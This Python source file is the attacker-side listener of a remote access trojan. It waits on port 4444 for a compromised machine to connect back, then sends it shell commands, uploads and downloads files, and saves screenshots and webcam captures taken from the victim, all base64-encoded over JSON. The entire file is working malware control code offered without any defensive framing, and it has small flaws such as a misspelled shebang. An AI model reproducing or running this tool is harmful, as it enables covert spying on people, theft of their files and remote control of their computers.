#!usr/bin/env python

# Import the modules.
import socket
import json
import sys
import base64

# Create the listener class.
class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create the listener object/socket.
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow the socket to reuse the address (debugging).
		listener.bind((ip, port)) #  Open a server and wait for incoming connections (ip, port).
		listener.listen(0) # Maximum host number before ignoring connections.

		print("[-] Waiting for incoming connections.")
		self.connection, address = listener.accept() # Accept the host and store into variables (a socket and an ip).
		user_name = socket.gethostname()
		print("[+] Got a connection from " + user_name + ": " + str(address)) # Print the ip and the port of the host.

	def reliable_send(self, data): # Function to send the data reliably.
		json_data = json.dumps(data) # Convert data into a json object (packaging).
		self.connection.send(json_data) # Send the json object.

	def reliable_recv(self): # Function to receive the data reliably.
		json_data = "" # Json data is at the start nothing.

		while True: # Infinite loop.
			try: # Try to:
				json_data = json_data + self.connection.recv(1024) # Receive the json data.
				return json.loads(json_data) # Unwrap the package.
			except ValueError: # If there is a value error, continue to receive data / go to the beginning of the loop.
				continue
 
	def execute_remotely(self, command):
		self.reliable_send(command) # Send the command.

		if command[0] == "exit": # If the first thing that's typed is "exit", then quit.
			self.connection.close() # Close connection.
			sys.exit() # Exit.

		return self.reliable_recv() # Receive the returned data.

	def write_file(self, path, content):
		with open(path, "wb") as file: # Allow to write as binary.
			file.write(base64.b64decode(content)) # Decode with base64.
			return "[+] Download successful."

	def screenshot(self, path, content):
		with open(path, "wb") as file: # Allow to write as binary.
			file.write(base64.b64decode(content)) # Decode with base64.
			return "[+] Screenshot successful."

	def camera_shot(self, path, content):
		with open(path, "wb") as file: # Allow to write as binary.
			file.write(base64.b64decode(content)) # Decode with base64.
			return "[+] Webcam shot successful."

	def read_file(self, path):
		with open(path, "rb") as file: # Allows to read as binary -> Downloading, uploading.
			return base64.b64encode(file.read()) # Encode with base64.
	
	def run(self):
		while True: # Create the infinite loop
			command = raw_input(">> ") # Enter a command after ">> ".
			command = command.split(" ") # Split the commands into a list.

			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)

				result = self.execute_remotely(command) # Receive the returned data.

				if command[0] == "download" and "[-] Error " not in result:
					result = self.write_file(command[1], result)

				if command[0] == "screenshot" and "[-] Error " not in result:
					result = self.screenshot(command[1], result)

				if command[0] == "webcam" and "[-] Error " not in result:
					result = self.camera_shot(command[1], result)

			except Exception:
				result = "[-] Error during command execution."

			print(result) # Print the data / result.

my_Listener = Listener("0.0.0.0", 4444) # Call the class.
my_Listener.run() # Call the run method.